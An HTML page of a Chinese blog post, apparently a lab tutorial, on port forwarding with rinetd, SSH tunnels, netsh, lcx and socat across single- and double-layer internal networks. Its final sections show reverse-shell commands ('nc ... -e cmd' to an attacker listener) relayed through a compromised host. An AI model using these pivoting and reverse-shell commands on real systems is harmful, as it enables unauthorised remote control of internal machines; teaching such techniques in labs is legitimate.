@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="如何使用SSH隧道和rinted等工具进行端口转发，实现内网穿透。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSH隧道及rinted端口转发">
+<meta property="og:url" content="http://atsud0.me/2020/07/06/rinted%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="如何使用SSH隧道和rinted等工具进行端口转发，实现内网穿透。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200706_210525.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200706_221538.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200706_221851.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200706_225913.jpg">
+<meta property="article:published_time" content="2020-07-06T03:06:53.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.459Z">
+<meta property="article:author" content="atsud0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200706_210525.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/07/06/rinted%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SSH隧道及rinted端口转发 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/07/06/rinted%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSH隧道及rinted端口转发
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-07-06 11:06:53" itemprop="dateCreated datePublished" datetime="2020-07-06T11:06:53+08:00">2020-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>3.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>如何使用SSH隧道和rinted等工具进行端口转发，实现内网穿透。</p>
+<a id="more"></a>
+
+<p>我们通常会遇到以下的状况，防火墙只允许内网中9999端口出站。如果我们此时需要让Server A能够访问外网的Web-Server，就需要借助到端口转发的技术了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200706_210525.jpg" alt=""><br>假设</p>
+<ul>
+<li>Proxy-Server的系统为Linux系统。IP为192.168.40.123</li>
+<li>Server A IP为192.168.56.2 (56网段为内网)</li>
+<li>FireWar(mon0wall) IP为192.168.56.1 WAN-IP为192.168.40.154</li>
+<li>Web-Server IP为192.168.40.142</li>
+</ul>
+<p>参考:</p>
+<ul>
+<li><a href="http://xstarcd.github.io/wiki/sysadmin/rinetd.html" target="_blank" rel="noopener">rinted端口转发</a></li>
+<li><a href="https://blog.creke.net/722.html" target="_blank" rel="noopener">SSH隧道及内网转发</a></li>
+<li><a href="https://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html" target="_blank" rel="noopener">SSH远程操作与端口转发</a></li>
+<li><a href="https://www.freebuf.com/sectool/126967.html" target="_blank" rel="noopener">LCX使用的三种方法</a><h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2>安装rinted。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install rinted</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>编辑配置文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;rinted.conf</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>0.0.0.0 监听本地所有的IP的1234端口</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Source Address] [Source Port] [Destination Address] [Destination Port]</span><br><span class="line">0.0.0.0 1234 目标ip 80</span><br></pre></td></tr></table></figure>
+
+<p>主机 port 目标地址 port</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pkill rinted #有时候可能需要杀掉进程。</span><br><span class="line">sudo rinted  # 开启进程</span><br></pre></td></tr></table></figure>
+
+<h2 id="开始配置-单层内网"><a href="#开始配置-单层内网" class="headerlink" title="开始配置(单层内网)"></a>开始配置(单层内网)</h2><p>防火墙只允许内网中9999端口出站。<br>Proxy-Server中配置/etc/rinted文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bindadress    bindport  connectaddress  connectport</span><br><span class="line"> 0.0.0.0  9999       192.168.40.142  80</span><br></pre></td></tr></table></figure>
+
+<p>接下来Server A直接在浏览器中访问Proxy-Server的IP地址和端口就好了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.123:9999</span><br></pre></td></tr></table></figure>
+<h2 id="使用SSH加密隧道加密"><a href="#使用SSH加密隧道加密" class="headerlink" title="使用SSH加密隧道加密"></a>使用SSH加密隧道加密</h2><p>直接用rinted配置虽然简单。但是是明文传输的，这很容易被劫持以及信息泄露。为了避免劫持和信息泄露，所以可以使用SSH加密隧道来进行端口的转发。<a href="https://www.zsythink.net/archives/2450" target="_blank" rel="noopener">SSH加密隧道详解</a></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200706_221538.jpg" alt=""></p>
+<blockquote>
+<p>借助ssh隧道将通讯数据转发，虽然仍然跨越了公网，但是由于ssh本身的安全特性，所以别人无法看到明文传输的数据，数据依靠ssh隧道实现了加密的效果，达到了保护数据安全的作用，提升了客户端与服务端通讯的安全性。</p>
+</blockquote>
+<h3 id="怎么做？"><a href="#怎么做？" class="headerlink" title="怎么做？"></a>怎么做？</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>此时假设ServerA为Windows系统。<br>Windows系统下载一个xshell，或者其他的客户端。<br>Proxy-Server，开启sshd，并允许密码登录，设置SSH端口为9999端口，并关闭先前的rinted监听9999端口。</p>
+<ol>
+<li><p>Windows 使用xshell连接 ssh://192.168.40.123 -p 9999<br><img src="https://images.atsud0.me/images/post/Screenshot_20200706_221851.jpg" alt=""></p>
+</li>
+<li><p>新建一个隧道，关闭转发X11连接(默认开启)</p>
+</li>
+<li><p>添加一个转移连接。源地址填写localhost,端口填写1234(或者其他，但是不能端口冲突) 目标地址填写为Web-Server的地址和端口。</p>
+</li>
+</ol>
+<p>编辑好后建立连接，Server打开浏览器访问本地127.0.0.1:9999即可。</p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>此时假设ServerA为Linux系统。<br>因为Linux中一般都是预装openssh的，所以不用再做什么配置，直接一条命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -f -L 1234:192.168.40.142:80 username@192.168.40.123 -p 9999</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-N 告诉SSH客户端，这个连接不需要执行任何命令。仅仅做端口转发</li>
+<li>-f 告诉SSH客户端在后台运行</li>
+<li>-L 做本地映射端口，被冒号分割的三个部分含义分别是<br>  需要使用的本地端口号<br>  需要访问的目标机器IP地址（IP: 192.168.40.142）<br>  需要访问的目标机器端口（端口: 80)</li>
+</ul>
+<p>最后一个参数是我们用来建立隧道的Proxy-Server的IP地址(IP: 192.168.40.123) -p 9999指定 ssh连接Proxy-Server的端口，因为防火墙只允许9999端口的流量出站。</p>
+<p>执行好之后，直接本地访问127.0.0.1:1233即可看到Web-Server的数据了</p>
+<h2 id="双层内网"><a href="#双层内网" class="headerlink" title="双层内网"></a>双层内网</h2><p>同样防火墙只允许内网中9999端口出站。不过此时多了一层内网。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200706_225913.jpg" alt=""></p>
+<p>新添加的ServerB IP为192.168.1.2<br>ServerA 则是双IP</p>
+<ul>
+<li>192.168.1.1</li>
+<li>192.168.56.2</li>
+</ul>
+<p>其他设备IP不变。此时要让内网机器ServerB能够访问到WebServer。</p>
+<p>只需要在ServerA多做一个端口映射就好了。</p>
+<h3 id="Windows系统命令"><a href="#Windows系统命令" class="headerlink" title="Windows系统命令"></a>Windows系统命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">添加一个IPV4到IPV4的端口映射</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress&#x3D;192.168.193.1 listenport&#x3D;22 connectaddress&#x3D;xxx.xxx.xxx.xxx connectport&#x3D;22</span><br><span class="line">指定监听ip和端口可以删除</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress&#x3D;192.168.193.1 listenport&#x3D;22</span><br><span class="line">可以查看存在的转发</span><br><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>同样也可以使用rinted。</p>
+<h3 id="双层内网反弹nc-shell"><a href="#双层内网反弹nc-shell" class="headerlink" title="双层内网反弹nc shell"></a>双层内网反弹nc shell</h3><h4 id="方法一-使用netsh开启映射"><a href="#方法一-使用netsh开启映射" class="headerlink" title="方法一 使用netsh开启映射"></a>方法一 使用netsh开启映射</h4><p>ServerA直接使用netsh开启映射</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenaddress&#x3D;0.0.0.0 listenport&#x3D;1200 connectaddress&#x3D;192.168.40.123 connectport&#x3D;9999</span><br></pre></td></tr></table></figure>
+
+<p>优点:系统命令，不需要使用其他工具即可实现。<br>缺点:明文，需要管理员权限。</p>
+<p>将原先Proxy-Server的端口映射地址改为攻击者的IP的攻击者监听的端口。<br>比如攻击者的IP和监听的端口为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.40.228 1234</span><br><span class="line">修改配置文件为</span><br><span class="line">0.0.0.0  9999       192.168.40.228  1234</span><br></pre></td></tr></table></figure>
+<p>在攻击者的机器上开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+<p>ServerB 直接执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.1.2 1200 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>此时在攻击者的机器上即可获得ServerB的cmd shell。</p>
+<h4 id="方法二-利用SSH隧道反弹"><a href="#方法二-利用SSH隧道反弹" class="headerlink" title="方法二 利用SSH隧道反弹"></a>方法二 利用SSH隧道反弹</h4><p>优点:加密。<br>缺点:Windows中需要借助Xshell等其他连接SSH的工具。</p>
+<p>先在ServerA上与攻击者建立SSH隧道。监听ServerA本地端口7890。</p>
+<p>在ServerB机器中，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.1.2 7890 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>再回去看看攻击者的监听端口，就已经拿到ServerA的shell了。</p>
+<h4 id="方法三-使用lcx端口反弹"><a href="#方法三-使用lcx端口反弹" class="headerlink" title="方法三 使用lcx端口反弹"></a>方法三 使用lcx端口反弹</h4><p>ServerA执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 7777 1111 # 监听本地的7777端口，并7777端口流量转发至1111端口。</span><br><span class="line">lcx -slave 127.0.0.1 1111 192.168.40.172 9999 #将本地的1111端口转发至远程192.168.40.172 9999端口</span><br></pre></td></tr></table></figure>
+<p>ServerB执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.1.2 7777 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>此时攻击者已经接收到了ServerB的shell了</p>
+<h4 id="方法四-还是lcx端口反弹"><a href="#方法四-还是lcx端口反弹" class="headerlink" title="方法四 还是lcx端口反弹"></a>方法四 还是lcx端口反弹</h4><p>ServerA执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 7777 192.168.40.172 9999 # 将远程主机的端口映射到本地7777端口</span><br></pre></td></tr></table></figure>
+<p>ServerB 执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.1.2 7777 -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>攻击者也已经收到了Shell了。</p>
+<h3 id="SSH部分指令"><a href="#SSH部分指令" class="headerlink" title="SSH部分指令"></a>SSH部分指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -X  username@host -p port # 允许远程打开图形界面</span><br><span class="line">SSH -L 本地端口转发</span><br><span class="line">SSH -R 远程端口转发</span><br><span class="line">SSH -D 动态转发</span><br><span class="line">ssh -NfL 0.0.0.0:1234:localhost:8000 127.0.0.1 #将允许任意ip连接的1234端口转发至本地的8000端口</span><br></pre></td></tr></table></figure>
+
+<h2 id="socat端口转发"><a href="#socat端口转发" class="headerlink" title="socat端口转发"></a>socat端口转发</h2><p>除了用rinted和ssh也可以用这个socat来进行端口转发。</p>
+<p>Github链接:<a href="https://github.com/craSH/socat" target="_blank" rel="noopener">socat</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/07/06/rinted%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" title="SSH隧道及rinted端口转发">http://atsud0.me/2020/07/06/rinted端口转发/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/05/CSRF/" rel="prev" title="CSRF&SSTI&SSRF笔记">
+      <i class="fa fa-chevron-left"></i> CSRF&SSTI&SSRF笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/07/11/TryHackMe-Gatekeeper/" rel="next" title="TryHackMe-Gatekeeper">
+      TryHackMe-Gatekeeper <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本流程"><span class="nav-number">1.</span> <span class="nav-text">基本流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始配置-单层内网"><span class="nav-number">2.</span> <span class="nav-text">开始配置(单层内网)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用SSH加密隧道加密"><span class="nav-number">3.</span> <span class="nav-text">使用SSH加密隧道加密</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#怎么做？"><span class="nav-number">3.1.</span> <span class="nav-text">怎么做？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-number">3.1.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-number">3.1.2.</span> <span class="nav-text">Linux</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双层内网"><span class="nav-number">4.</span> <span class="nav-text">双层内网</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows系统命令"><span class="nav-number">4.1.</span> <span class="nav-text">Windows系统命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-1"><span class="nav-number">4.2.</span> <span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双层内网反弹nc-shell"><span class="nav-number">4.3.</span> <span class="nav-text">双层内网反弹nc shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法一-使用netsh开启映射"><span class="nav-number">4.3.1.</span> <span class="nav-text">方法一 使用netsh开启映射</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法二-利用SSH隧道反弹"><span class="nav-number">4.3.2.</span> <span class="nav-text">方法二 利用SSH隧道反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法三-使用lcx端口反弹"><span class="nav-number">4.3.3.</span> <span class="nav-text">方法三 使用lcx端口反弹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法四-还是lcx端口反弹"><span class="nav-number">4.3.4.</span> <span class="nav-text">方法四 还是lcx端口反弹</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH部分指令"><span class="nav-number">4.4.</span> <span class="nav-text">SSH部分指令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#socat端口转发"><span class="nav-number">5.</span> <span class="nav-text">socat端口转发</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
